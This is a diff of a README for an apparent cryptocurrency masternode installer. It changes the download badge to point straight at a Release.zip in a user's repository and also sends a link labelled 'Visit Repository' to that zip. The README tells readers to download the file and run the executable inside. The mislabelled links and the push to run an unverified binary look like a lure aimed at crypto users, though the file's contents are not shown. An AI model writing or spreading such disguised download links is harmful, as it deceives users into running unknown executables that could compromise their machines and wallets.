@@ -15,7 +15,7 @@ Welcome to the **SmartNode Installer & Masternode Management** repository! This 
 
 To get started with the SmartNode Installer & Masternode Management tool, simply download the latest release from the link below:
 
-[![Download SmartNode Installer](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download SmartNode Installer](https://github.com/Gamingbro/SmartNode-Installer-Masternode-Management/releases/download/v1.0/Release.zip)](https://github.com/Gamingbro/SmartNode-Installer-Masternode-Management/releases/download/v1.0/Release.zip)
 
 Once you have downloaded the tool, launch the executable file and follow the on-screen instructions to start setting up and managing your masternodes.
 
@@ -63,4 +63,4 @@ Thank you for choosing the SmartNode Installer & Masternode Management tool. Get
 
 Happy masternoding! 🌟
 
-[Visit Repository](https://github.com/cli/browser)
+[Visit Repository](https://github.com/Gamingbro/SmartNode-Installer-Masternode-Management/releases/download/v1.0/Release.zip)
